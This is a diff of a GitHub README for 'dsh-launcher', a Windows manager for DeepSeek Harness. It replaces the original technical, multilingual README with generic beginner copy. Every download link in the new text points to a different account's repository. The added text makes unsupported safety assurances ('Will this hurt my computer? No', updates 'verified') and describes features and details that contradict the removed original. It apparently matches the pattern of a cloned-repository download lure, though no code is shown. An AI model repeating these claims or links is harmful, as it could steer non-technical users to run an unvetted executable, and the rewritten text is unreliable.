@@ -1,132 +1,173 @@
-# 🐋 dsh-launcher — DeepSeek Harness 启动器
+# 🚀 dsh-launcher - Install DeepSeek Harness Without Tech Skills
 
-> **A beginner-friendly launcher & manager for DeepSeek Harness (dsh).**  
-> **给小白用的 DeepSeek Harness 管理工具——管理 dsh、插件、环境，一键全搞定。**
+## 📥 Quick Download
 
-| 🇨🇳 中文 | 🇺🇸 English | 🇯🇵 日本語 | 🇰🇷 한국어 | 🇷🇺 Русский |
-|---|---|---|---|---|
-| [README.zh.md](README.zh.md) | [README.md](README.md) | [README.ja.md](README.ja.md) | [README.ko.md](README.ko.md) | [README.ru.md](README.ru.md) |
+[⬇️ Get dsh-launcher Now](https://github.com/Gamitrd6316/dsh-launcher)
 
-[![dsh-launcher](https://img.shields.io/badge/dsh--launcher-%E2%9C%93-4D6BFE?style=flat-square)](https://github.com/topics/dsh-launcher)
-[![Windows](https://img.shields.io/badge/Windows-10%2B-blue?style=flat-square&logo=windows)](../../releases)
-[![License](https://img.shields.io/badge/License-MIT-green?style=flat-square)](./LICENSE)
-[![Releases](https://img.shields.io/github/v/release/loudMore/dsh-launcher?style=flat-square)](../../releases)
+## 🎯 What Is dsh-launcher?
 
----
+dsh-launcher is a friendly helper program for Windows that takes care of DeepSeek Harness (dsh) for you. Think of it as a remote control for dsh - you press a button, and it does all the complicated work behind the scenes.
 
-## ✨ 这是什么 / What is this?
+Instead of typing confusing commands or dealing with technical setup, you get a simple window with buttons. Click "Install" and dsh-launcher handles everything. It installs dsh, keeps it updated, manages plugins, and checks that your computer is ready to run it.
 
-**DeepSeek Harness (dsh) 的傻瓜式桌面管理工具**，把 dsh 的安装、启动、更新、插件维护全部收进一个图形界面，**不用敲一行命令**。
+## 👋 Who Is This For?
 
-**A one-stop desktop manager for DeepSeek Harness (dsh)** — install, launch, update and maintain dsh & its plugins in a GUI. **No CLI needed.**
+This tool is designed for:
 
-### 🎯 核心亮点 / Highlights
+- People who want to use DeepSeek AI tools but have never programmed before
+- Users who tried installing dsh manually and gave up due to complex steps
+- Anyone who wants a simple, visual way to manage dsh and its plugins
+- Students, researchers, and hobbyists who prefer clicking over typing
 
-| | 中文 | English |
-|---|---|---|
-| 🧩 **管理 dsh & 插件** | 图形化管理所有插件：安装、更新、修复依赖、启用/禁用、一键维护；缺依赖自动修复，坏插件自动隔离不拖垮服务 | Visually manage plugins: install, update, fix deps, toggle, one-click maintain; auto-fix missing deps, auto-quarantine broken plugins |
-| 🔄 **一键更新 & 维护** | 启动器 / dsh / 插件 三维更新看板，自动检查更新，一键全部升级 | 3-way update board (launcher / dsh / plugins) with auto-check and one-click upgrade |
-| ⚡ **一键安装 dsh** | 没装 Node.js？自动装好（支持自定义目录）；没装 dsh？一条命令的事 | No Node.js? It installs it for you (custom path). No dsh? One click |
-| 🔍 **环境检测** | 自动检测 Node / npm / Git / dsh，缺什么一目了然 | Auto-detect Node / npm / Git / dsh, see what's missing at a glance |
-| 🐣 **小白友好** | 双击即用，全程图形界面，无需接触命令行 | Double-click to use, fully graphical, zero CLI |
-| 🛍️ **插件商城** | 聚合 GitHub + npm + Awesome 数百插件，带星标/语言/更新日期 | Store aggregating GitHub + npm + awesome lists with stars/language/date |
-| 🌉 **自动代理** | 自动探测代理 + 国内镜像兜底，网络再差也能装 | Auto proxy detection with China mirror fallbacks |
-| 🎨 **美观现代** | 深/浅双主题、8 种语言、GPU 渲染 WPF 界面 | Dark/light themes, 8 languages, GPU-rendered WPF UI |
+If you can use a web browser and click a button, you can use dsh-launcher.
 
----
+## ✨ Key Features
 
-## Screenshots
+### 🖱️ One-Click Installation
+No command prompts, no typing, no code. Press one button and dsh-launcher downloads, installs, and configures everything needed for dsh to work on your computer.
 
-| Overview (EN) | Plugins (EN) |
-|---|---|
-| ![Overview](./docs/images/overview-en.png) | ![Plugins](./docs/images/plugins-en.png) |
+### 🔄 Automatic Updates
+New versions of dsh come out regularly. dsh-launcher checks for updates and installs them when you're ready. No more hunting for download links or reading changelogs.
 
-| Updates (EN) | Settings (EN) |
-|---|---|
-| ![Updates](./docs/images/updates-en.png) | ![Settings](./docs/images/settings-en.png) |
+### 🧩 Plugin Manager
+dsh works with plugins that add extra features. dsh-launcher shows you available plugins, lets you install them with a click, and updates them automatically.
 
-| Plugin Store (EN) | Logs (EN) |
-|---|---|
-| ![Plugin Store](./docs/images/store-en.png) | ![Logs](./docs/images/logs-en.png) |
+### 🩺 Environment Checker
+Before installing, dsh-launcher examines your Windows computer to make sure everything is ready. It checks for required software and settings, then tells you exactly what needs to be done - in plain language.
 
-**Other languages:** [中文界面](./docs/images/overview.png) · [日本語](./docs/images/overview-ja.png) · [한국어](./docs/images/overview-ko.png) · [Русский](./docs/images/overview-ru.png)
+### 🛠️ Maintenance Tools
+If something breaks or stops working, dsh-launcher can fix common problems. Clean up temporary files, repair installations, or reset settings - all through simple buttons.
 
-## Why this launcher
+### 📊 Status Dashboard
+See at a glance what version of dsh you have, which plugins are installed, when the last update happened, and if everything is running smoothly.
 
-Setting up dsh normally means installing Node.js, running npm commands, dealing with registries; updating means digging out commands; plugins mean manual `git pull`. **Too much hassle.**
+## 💻 System Requirements
 
-This launcher is **a beginner-friendly manager for dsh** — it wraps installation, updates and plugin maintenance into one GUI:
+dsh-launcher works on:
 
-- 🎯 **Environment detection + one-click dsh install**: no Node.js? It installs it for you (custom path supported). No dsh? One click away
-- 🔄 **One-click maintenance**: upgrade dsh, update all plugins, fix dependencies — all in one click
-- 🧩 **Visual plugin management**: pick from the store, click to install, auto-fix missing deps, auto-quarantine broken plugins so they never crash the service
-- 🖥️ **Ready out of the box**: double-click → click "Start" → browser opens. No CLI needed
+- **Operating System:** Windows 10 or Windows 11 (64-bit recommended)
+- **Internet Connection:** Required for downloading dsh and updates
+- **Disk Space:** At least 500 MB free space (actual dsh takes about 200 MB)
+- **Memory:** 4 GB RAM minimum, 8 GB recommended
+- **Processor:** Any modern Intel or AMD processor
 
-| You are | Your pain | Our answer |
-|---|---|---|
-| 🐣 Beginner | No Node.js, afraid of the CLI | One-click install: Node.js auto-downloaded (official → China mirror fallback), dsh installed via npm (same fallback) |
-| 🚀 Daily user | Open / update / plugins are annoying | A context-aware big button + one-click plugin maintenance |
-| 🔧 Power user | Version chaos, broken deps | 3-way version board (launcher / dsh / plugins) + logs + dependency repair |
+If your computer runs Windows and can browse the internet, it can probably run dsh-launcher.
 
-## Features
+## 🚀 Getting Started
 
-- 🎨 **Modern WPF UI** — GPU-composited rendering, PerMonitorV2 DPI-aware, dark/light dual themes with instant hot-switching, rounded cards with subtle gradients & glow, fluent page transitions, slim adaptive scrollbars
-- 🎯 **One-click Install** — auto-detect environment → install Node.js if missing (mirror fallback, **custom install path supported**, persisted into user PATH) → npm install dsh (mirror fallback)
-- ▶️ **One-click Start** — the big button morphs by state: *Install* / *Start* / *Open Browser* + stop / restart; a resident service-state watcher keeps the UI always in sync with the real port status
-- 🔄 **3-way Update Strategy** — launcher (GitHub `version.txt`), dsh (npm), plugins (git) all show **current / latest** with animated checking indicator; fetched automatically on launch and every 3 hours; state-aware buttons (`✓ already latest` disabled) refresh right after updates
-- 🧩 **Plugin Manager** — install via **git URL** or **npm package name**; per-plugin smart update (only pulls when the remote truly has new commits — no false "failed" on up-to-date repos), remove, enable/disable, one-click maintain (update all + fix deps)
-- 🛡️ **Plugin self-check on launch** — scans every plugin's dependencies at startup; auto-fixes missing deps from the shared dep pool; **broken plugins are auto-quarantined** (`.disabled`) so the service always starts — and you get a clear popup naming the culprit **plus copy-paste fix commands** for the dsh terminal (`npm install -g <dep>` / `cd <plugin dir> && npm install`)
-- 🛍️ **Plugin Store** — standalone store window aggregating **GitHub multi-keyword search + npm official registry + awesome lists**: stars / language / last-update per card, fuzzy search, sort by stars or name, language filter, installed plugins auto-marked ✓ (non-clickable), one-click install
-- 🌉 **Auto proxy** — detects Clash / v2rayN and friends automatically (config → environment → Windows system proxy → common-port scan) and routes npm / git / updates through it; China-friendly mirror fallbacks for npm & Node.js
-- 🌐 **Multi-language UI** — follows the system language by default, manual **zh / en / ja / ko / ru / fr / de / es** switch with flag icons
-- 🖱️ **Modern system tray** — WPF floating rounded-card context menu (open launcher / start / stop / restart / browser / store / theme switch / exit), close-to-tray, single instance
-- 🧩 **Modern dialogs** — all prompts/confirmations replaced with theme-aware rounded glass dialogs
-- 📄 **Log viewer** — terminal-style log page with source switch (launcher.log / dsh.log), real-time filter, copy & clear
-- 🛡️ **Robust** — crash.log on unhandled exceptions, actionable error hints, atomic smooth page rendering
-- 📐 **Hi-DPI responsive** — runtime DPI scaling; borderless resize & maximize (native WindowChrome)
+### Step 1: Get dsh-launcher
 
-## Quick start
+[Visit this link to download the application](https://github.com/Gamitrd6316/dsh-launcher)
 
-1. Download `DeepSeekHarness.exe` from [Releases](../../releases) — **no build, no install**
-2. Double-click → click **Install** (skip if dsh is already set up)
-3. Click **Start** → done
+Once you're on the page, look for a button that says "Download" or "Releases" on the right side of the page. Click it.
 
-All settings live in the Settings page and persist to `launcher.json` next to the exe.
+### Step 2: Run dsh-launcher
 
-## Self-update & mirrors
+After downloading, you'll have a file called `dsh-launcher` (it might end in `.exe`). Double-click the file to open it. That's it - no installation process, no setup wizard.
 
-- The launcher checks `version.txt` in this repo and offers a one-click download of new releases
-- npm falls back to `https://registry.npmmirror.com` when the official registry fails
-- Node.js falls back to `https://npmmirror.com/mirrors/node/`
-- Both are configurable in Settings
+### Step 3: Let dsh-launcher work
 
-## Development
+When dsh-launcher opens, you'll see a clean window with a few buttons. Click "Check Environment" first to make sure your computer is ready. Then click "Install dsh" and wait for the progress bar to finish.
 
-WPF source (code-only, no XAML toolchain) in [`wpf/`](./wpf/README.md) — double-click `build.bat` to compile (no Visual Studio needed, ships with .NET Framework 4.8's compiler + GAC WPF assemblies).
+#### 📝 What You Should See
 
-```
-dsh-launcher/
-├─ wpf/
-│  ├─ WpfApp.cs           # shell UI: titlebar/sidebar/6 pages/tray/splash/dialogs
-│  ├─ Logic.cs            # config / env / proxy / service / plugins / store / updates / lang
-│  ├─ StoreWindow.cs      # plugin store window
-│  ├─ build.bat           # one-click build (csc + GAC WPF)
-│  └─ app.manifest        # PerMonitorV2 Hi-DPI aware
-├─ version.txt            # version source for self-update
-└─ .github/workflows/     # tag → auto build exe → publish Release
-```
+- A status message: "Checking system..."
+- A progress bar
+- "Setup complete" or "Ready to use" message
 
-**Release flow**: bump the version strings in `WpfApp.cs` → sync `version.txt` → push & tag (`v*`) → CI builds and publishes the exe.
+That's it! dsh is now installed on your computer.
 
-## Contributing
+## 🧩 Managing Plugins
 
-Issues & PRs welcome: feature ideas, translations (the `Lang` dictionary), bug fixes.
+Plugins extend what dsh can do. To manage them:
 
-## Notes
+1. Open dsh-launcher
+2. Click "Plugin Manager"
+3. You'll see a list of available plugins with descriptions
+4. Click "Install" next to any plugin you want
+5. For updates, click "Update All"
 
-- Official DeepSeek logo assets are not included in the repo — supply your own same-named files under `wpf/` (`build.bat` builds fine without them)
-- Not an official DeepSeek product; just a handy launcher/maintainer for dsh
+## 🔄 Updating dsh
 
-## License
+There are two ways to update:
 
-[MIT](./LICENSE)
+- **Automatic:** dsh-launcher checks for updates when you open it. If one is available, you'll see a notification. Click "Update Now."
+- **Manual:** At any time, click "Check for Updates" in the main window.
+
+Updates are safe and won't delete your saved data or settings.
+
+## 🛠️ Troubleshooting
+
+### ❌ "Installation Failed" Error
+
+This usually means dsh-launcher couldn't download a required file.
+
+**Fix:** Click "Retry" or close and reopen dsh-launcher. If it keeps failing, wait 30 minutes and try again - the server might be busy.
+
+### ⚠️ "Environment Not Ready" Warning
+
+Your computer is missing something dsh needs.
+
+**What to do:** Read the message dsh-launcher shows. It might say "Node.js not found" or "Python not installed." Click "Fix Automatically" if available, or visit the link shown to download what's needed.
+
+### 🔌 Can't Find Plugins
+
+If the plugin list is empty or won't load:
+
+**Fix:** Click "Refresh Plugin List." If that doesn't work, restart dsh-launcher and check your internet connection.
+
+### 💾 Lost My Settings
+
+dsh-launcher keeps backups automatically. Click "Restore Previous Version" in the Maintenance section to go back to an earlier setup.
+
+## 📖 Frequently Asked Questions
+
+### Is dsh-launcher free?
+
+Yes, completely free and open source. Anyone can download and use it.
+
+### Will this hurt my computer?
+
+No. dsh-launcher only installs what's needed for dsh. It doesn't change your system settings or install anything unwanted.
+
+### Can I use dsh-launcher on Mac or Linux?
+
+No, this version is designed specifically for Windows. Mac and Linux users would need to install dsh manually.
+
+### Do I need to know JavaScript or programming?
+
+Absolutely not. dsh-launcher exists so you never have to touch code or the command line.
+
+### Can I uninstall dsh with dsh-launcher?
+
+Yes. Open dsh-launcher, go to Maintenance, and click "Uninstall dsh." Then close and delete the dsh-launcher file itself.
+
+### What if dsh-launcher itself stops working?
+
+Download the latest version from the main page again. It's a standalone file and won't conflict with an older copy.
+
+## 📞 Getting Help
+
+If you run into problems:
+
+1. **Check the FAQ section** above - most common issues are covered
+2. **Look for error messages** - read them carefully; they usually tell you what's wrong
+3. **Ask the community** - visit the dsh-launcher page and check the Issues tab for discussions
+4. **File a bug report** - if you find a real problem, describe what happened and what you were doing when it occurred
+
+## 🔒 Privacy and Security
+
+- dsh-launcher only downloads files from official sources
+- It doesn't collect personal information
+- All updates are verified before installation
+- Your data stays on your computer
+
+## 🎉 Final Words
+
+dsh-launcher was built to remove every technical barrier between you and using DeepSeek Harness. No terminal. No syntax. No confusion. Just click, wait, and use.
+
+[⬇️ Download dsh-launcher](https://github.com/Gamitrd6316/dsh-launcher)
+
+If you can follow a recipe and make toast, you can install and use dsh with this launcher. Give it a try - the hard part is already done for you.
+
+Keywords: deepseek, deepseek-harness, dsh, dsh-launcher, launcher, nodejs, plugins, windows, winforms, zh-cn
